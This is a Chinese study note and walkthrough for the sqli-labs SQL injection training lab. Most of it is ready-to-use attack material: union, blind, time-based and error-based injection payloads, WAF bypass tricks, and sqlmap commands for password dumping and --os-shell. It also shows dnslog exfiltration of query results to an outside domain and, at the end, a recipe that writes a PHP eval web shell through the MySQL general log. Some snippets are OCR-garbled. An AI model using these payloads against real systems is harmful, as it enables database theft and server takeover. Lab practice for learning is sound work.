

[toc]

第一关

1. 找到注入点

   http://192.168.157.137/sqli-labs/Less-1/index.php

2. 猜测后端查询语句

   ```
   select * from xxx_tbl where id='1' limit 0,1;
   ```

3. 判断字段数

   ```
   select * from xxx_tbl where id='1' order by 3%23' limit 0,1;
   ```

4. 判断显示位

   ```
   select * from xxx_tbl where id='-1' union select 1,2,3%23' limit 0,1;
   ```

5. 查库名

   ```
   select * from xxx_tbl where id='-1' union select 1,2,database()%23' limit 0,1;
   
   security
   ```

6. 查表名

   ```
   select * from xxx_tbl where id='-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'%23' limit 0,1;
   
   emails,referers,uagents,users
   ```

   

7. 查列名

   ```
   select * from xxx_tbl where id='-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security'%23' and table_name='users'limit 0,1;
   username,password
   ```

   

8. 查记录

   ```
   select * from xxx_tbl where id='-1' union select 1,2,group_concat(username,password) from users limit 0,1;
   ```

   

第二关

1. 找到注入点

   http://192.168.157.137/sqli-labs/Less-2/index.php

2. 判断注入类型

   通过2-1被运算，判断出是数字型，没有闭合符

3. 猜测后端查询语句

   select * from xxx_tbl where id=1 limit 0,1;

4. 判断字段数

   以上

5. 判断显示位

   以上

6. 查库名

   以上

7. 查表名

   以上

8. 查列名

   以上

9. 查记录

   以上
   
   

第三关

1. 找到注入点

   http://192.168.157.137/sqli-labs/Less-3/index.php

2. 猜测后端查询语句

   select * from xxx_tbl where id=('1') LIMIT 0,1

3. 判断字段数

   select * from xxx_tbl where id=('1')') order by 3# LIMIT 0,1

4. 判断显示位

   select * from xxx_tbl where id=('-1')') union select 1,2,3# LIMIT 0,1

5. 查库名

6. 查表名

7. 查列名

8. 查记录

   

第四关

联合查询注入



第五关

盲注

延时盲注

报错注入



第六关

盲注

延时盲注

报错注入



第七关

文件读写



第八关

盲注

延时盲注



第九关

延时注入



第十关

延时注入



第11关

表单注入

在密码框用联合语句



第12关

参考11关



第13关

报错语句



第14关

报错语句

密码框延时注入



第15关

延时注入



第16关

延时注入



第17关

报错注入

123123' WHERE username='Dhakkan' and (select 1 from (select count(*),concat((select substr(group_concat(table_name),1,10) from information_schema.tables where table_schema='security'),floor(rand(0)*2))x from information_schema.tables group by x)a)#



第18关

利用modheader插件

User-Agent：



第19关

利用modheader插件

Referer：

第20关





# 什么是sqli？

SQLi（SQL injection），SQL注入。

# sqli原理

由于后端代码对于前端输入的识别和处理的不严谨，导致攻击者从前端提交的sql语句片段被拼接
到后端数据库查询语句中，执行预期外的SQL查询。

# sqli危害？

条件满足的情况下会造成：
盗窃系统机密数据、能够篡改网站页面、接管服务器
拖库、写入文件、执行系统命令等

# 找到一个SQLi注入，如何利用？

拖库、写入文件、执行系统命令等
能执行系统命令后判断用户权限，如果是管理员权限就有很多可做的事情了，比如潜伏和远程控制
等。

# 通用的SQLi注入的思路是什么？

1.  找到注入点
2.  猜测后端查询语句
    1.  判断注入类型
    2.  判断闭合符
3.  构造注入

# 联合查询

1. 联合查询SQLi的思路是什么？
   1. 找到注入点
   2. 猜测后端查询语句
      1. 判断注入类型
      2. 判断闭合符
   3. 判断字段数
   4. 判断显示位
   5. 查库名
   6. 查表名
   7. 查列名
   8. 查记录

2. 基本函数
   ascii(STR)，ascii函数用来返回字符串STR的最左面字符的ASCII代码值（十进制）。如果STR是空字
   符串，返回0。如果STR是NULL，返回NULL。这个函数可以和substr函数配合来使用猜测一个字
   符。

   ```
   # #的URL编码为%23，其中的数字是十六进制的。
   # ASCII()返回的数字是十进制的，下方SQL查询返回35
   select ascii('#');
   select ascii(substr(database(), 1, 1))
   # database()——》demo——》select ascii(substr('demo', 1, 1))
   # substr('demo', 1, 1)——》d——》select ascii('d')
   ```

# 如何布尔盲注？

1. SQLi中布尔盲注利用步骤是什么？

   - 找到注入点

   - 猜测后端查询语句

     select * from xxx_tbl where id=’xxx‘ limit 0,1

     - 判断注入类型
       字符型
     - 判断闭合符
       单引号

   - 构造布尔查询子语句
     ascii(substr(database(), 1, 1))>1

   - 注入到url参数中提交

     1' and ascii(substr(database(),1,1))>115%23

   - 不停变换比较的数字，逼出我们想要查询的字母的ascii码

   - ascii码表中反查字母

   - 反复作5-8步，查询出所有想查询的内容

# floor报错注入是什么？

双（查询）注入，又称floor报错注入，想要查询select database()，只需要输入后面语句即可在
MySQL报错语句中查询出来：

```
1、union select count(*), concat((payload), floor(rand()*2)) as a from information_schema.tables group by a
2、and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

count(*)必须带上

1. 输出长度限制为32个字符
2. 后台返回记录列数至少2列



# updatexml()报错注入是什么？

MySQL执行1=(updatexml(1,concat(0x3a,(payload)),1))将报错。
限制1：输出字符长度限制为32个字符
限制2：仅payload返回的不是xml格式，才会生效

# Extractvalue()报错注入是什么？

模板1：and extractvalue('anything',concat('/',(Payload)))将报错，不推荐使用。
模板2：union select 1,(extractvalue(1,concat(0x7e,(payload),0x7e))),3，不存在丢失报错成果的
情况。

# 报错注入的其他12种

> 1、通过floor报错,注入语句如下:
> and select 1 from (select count(),concat(version(),floor(rand(0)2))x from
> information_schema.tables group by x)a);
> 2、通过ExtractValue报错,注入语句如下:
> and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables
> limit 1)));
> 3、通过UpdateXml报错,注入语句如下:
> and 1=(updatexml(1,concat(0x3a,(selectuser())),1))
> 4、通过NAME_CONST报错,注入语句如下:
> and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select
> name_const(@@version,0))b)c)
> 5、通过join报错,注入语句如下:
> select * from(select * from mysql.user ajoin mysql.user b)c;
> 6、通过exp报错,注入语句如下:
> and exp(~(select * from (select user () ) a) );
> 7、通过GeometryCollection()报错,注入语句如下:
> and GeometryCollection(()select *from(select user () )a)b );
> 8、通过polygon ()报错,注入语句如下:
> and polygon (()select * from(select user ())a)b );
> 9、通过multipoint ()报错,注入语句如下:
> and multipoint (()select * from(select user() )a)b );
> 10、通过multlinestring ()报错,注入语句如下:
> and multlinestring (()select * from(selectuser () )a)b );
> 11、通过multpolygon ()报错,注入语句如下:
> and multpolygon (()select * from(selectuser () )a)b );
> 12、通过linestring ()报错,注入语句如下:
> and linestring (()select * from(select user() )a)b );

# 如何读写文件？

SELECT "123" INTO OUTFILE "c:/123.txt";
SELECT "123abc" INTO DUMPFILE "c:/123.txt";

要使用联合查询写文件，不能使用and或or拼写文件

#### 首要条件

1. 绝对路径

2. file_priv开关需要打开状态

   select file_priv from mysql.user;

3. secure_file_priv=

   默认是空，等号后面什么都不加

   - 设置为空，那么对所有路径均可进行导入导出。
   - 设置为一个目录名字，那么只允许在该路径下导入导出。
   - 设置为Null，那么禁止所有导入导出。



# 如何延时盲注？

1. 延时盲注如何注入？

   1. 找到注入点

   2. 判断注入类型和闭合符

      1' and sleep(3)%23

   3. 猜测后端查询语句

      select * from t_xxx where id='1'

   4. 构造注入

      1' and if(ascii(substr(database(),1,1))>115,sleep(3),0)%23

# 如何表单注入？

> 找到注入点
>
> 猜测后端查询语句
> select * from t_xx where cxx_user='xxx' and cyy_pass='yyy' LIMIT 0,1
>
> 判断列数:2列
> select * from t_xx where cxx_user='xxx' and cyy_pass='yyy' order by 10#' LIMIT 0,1
>
> 判断显示位
> select * from t_xx where cxx_user='xxx' and cyy_pass='yyy' union select 1,2#' LIMIT 0,1
>
> 查库名:security
> database()
> select * from t_xx where cxx_user='xxx' and cyy_pass='yyy' union select 1,database()#' LIMIT 0,1
>
> 查表名:emails,referers,uagents,users
> select table_name from information_schema.tables where table_schema='security'
>
> select * from t_xx where cxx_user='xxx' and cyy_pass='yyy' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#' LIMIT 0,1
>
> 查列名:id,username,password
> select column_name from information_schema.tables where table_schema='security' and table_name='users'
>
> select * from t_xx where cxx_user='xxx' and cyy_pass='yyy' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'#' LIMIT 0,1

# post表单中如何延时盲注？

基础知识

select * from users where username = 'asdf' or sleep(3);

真 and 真 = 真

真 and 假 = 假

假 and 真 = 假

假 and 假 = 假



真 or 真 = 真

真 or 假 = 真

假 or 真 = 真

假 or 假 = 假

# 如何http头部注入？

如果猜测到后端有SQL查询，而且会带入http请求头中的字段内容，那么该功能点可能存在SQL注
入。
头部注入通常用在后端记录日志入库的场景。

# 如何update、insert注入使用报错注入？

# dnslog带外注入的原理是什么？

原理：在后端的数据库用户拥有读写文件权限的情况下，将想要查询的字符串拼接到dnslog的域名中，然后发起对应网站的资源请求，就能把想要查询的结果外带到dnslog平台上方便查看。

# 如何进行dnslog？

用concat函数构造dnslog的域名没用select load_faile()发起网络请求，到dnslog平台上收割。

```
SELECT 1oad_file("D:/TEST. TXT");
SEL ECT 1oad_file("'\\\\test. ahfr2z. dns1og.cn\aa");

SELECT
SELECT 1oad_file("'\\\\test. ahfr2z. dns1og.cn\aa");
1oad_file (concat("\\\"，databaseahfr2z.dnslog.cn\\aa"));

SELECT 1oad_file (concat("\\\"，database(),".ahfr2z.dnslog. cn\\aa"));
```



# 宽字节注入的原理？

条件：后端使用GBK编码的时候，背后存在着将ASCII码转换为GBK编码的过程，可以使用宽字节注入。

原理：

编码转换存在着单字符被合并的情形

> 反斜杠对应16进制编码是5c，是单字节的.
>
> 在5c前再加上一个但字节字符dd（范围可以是81-FE之间），就成了dd5c
>
> 而当后端使用GBK编码的时候，会将合理的两个单字节ANSCII字符解析成一个双字节的gbk编码字符。
>
> 导致5c对应的反斜杠被和谐掉

# 如何进行宽字节注入？

闭合符前加入81-FE之间的字符。放到url中需要加%。

# like注入如何注入？

猜测搜索功能点的查询语句

select * from news where content like '%搜索的内容%'；

@ 'order by 10#

# mysql注入的绕过方式？

编码字符串

过滤绕过

- and -> &&
- or -> ||
- =,>,<用between()函数、like关键字绕过
- 空格 -> +,/**/
- limit 0,1用limit 0 offset 1绕过
- subsrt用mid，substring绕过
- sleep用benchmark绕过

大小写绕过

内外双写绕过

内联注释绕过/**/

%00等空白符嵌入绕过waf

超大数据包绕过

双提交绕过

异常请求方法绕过



宽字节注入

十六进制编码

# sqlmap有哪些功能？

能够对多种不同数据库进行不同类型的注入，比如：

1. 对不同数据库管理系统进行注入
2. 查库表列和数据的功能
3. 注入读写文件
4. 注入执行系统命令等

# sqlmap各个选项什么意思？

--level探测等级，数值越高，等级越高，默认为1。

在不确定哪个payload或参数为注入点时，为了保证全面性，建议使用高的level值

--level2会探测cookie

--level3会探测user-agent、referer头

-V X参数指定回显信息的复杂度，x属于[0~6]。3可以查看sqlmap注入使用的payload。

--is-dba判断当前用户是不是DBA

--privileges查看权限

--users查看 当前用户

--passwords查看密码

--os-shell获取os-shell

--batch全部采用默认选择

# sqlmap渗透时需要注意什么？

1. 不要用托库的选项
2. 尽量不要注入有修改功能的注入点

# sqlmap如何对一个url进行get型注入？

寻找注入点

截取访问连接：

得到注入点：http://sxxx

**查询库名**

打开cmd，切换当前目录到D:\SQLMAP\

执行命令：python sqlmap.py -u "注入点" --current-db

**指定库名查表名**

执行命令：python sqlmap.py -u "注入点"  -D 库名 --tables

**指定库名、表名查列名**

执行命令：python sqlmap.py -u "注入点" -D 库名 -T 表名 --columns

**获取sql-shell**

执行命令：python sqlmap.py -u "注入点" --sql-shell

**查记录**
前面步骤获取到表结构后，在sql-shell提示符后面输入SQL语句查询记录:
输入sql语句查询记录：

select username, password from t_ _admin; 

获得管理员账号记录:

账号：admin

md5 ：xxx

# 如果发现网页有个表单，如何进行注入？

--from

>sqlmap.py-u (url) --forms --batch表框注入，不需要任何操作，自动测试注入。

# 如何对一个url通过post进行注入？

--data "var1=parm1 &var2=parm2"

# 拿到一个HTTP请求包，如何进行注入？

-r "request.txt" 

>  sqlmap.py-r 1.txt

# 如何执行HTTP头部注入？

sqlmap.py -U "X.XXXXX" --level 2 --cookie "xx=xx"

# 如何进行伪静态注入？

url后面加* (星号）

-u "http://host/app/index/id/1*"

# sqlmap如何绕WAF？

通过--tamper选项绕过: --tamper

space2morehash.py

设置延时请求间隔秒: --delay=2

定期访问安全页面: --safe-url, --safe-freq

# sqlmap如何拿shell？

--os-shell

前提:必须知道网站根目录的绝对路径

# sqli如何防御或修复？

1. 正确地采用安全的数据库连接方式，如php中的PDO或MySQLi并使用预编译等技术

2. 采用成熟的防注入的框架(参考thinkphp、OWASP网站、或者Discuzz及WordPress等的防注入手段)

3. 细节上:

   1. 对于提交的数字型参数，需严格限定数据类型；
   2. 特殊的字符转义
   3. 避免存储过程出现注入

   扩展:

   堆叠注入: -次性执行多条sq|注入查询，多条语句用;分隔。前提条件:后端支持堆叠查询(多条语句查询)。

   二次注入:三阶段介绍(需要代码审计)

# sql写日志getshell

show variables like '%general%';查看日志配置（开关、位置）

set global general_log = on#开启日志

set global general_log_file='c:/phpstudy/www/methehack.php';设置日志位置为网站目录

select '<?php eval($_POST["a"]); ?>'#执行生成包含木马日志的查询

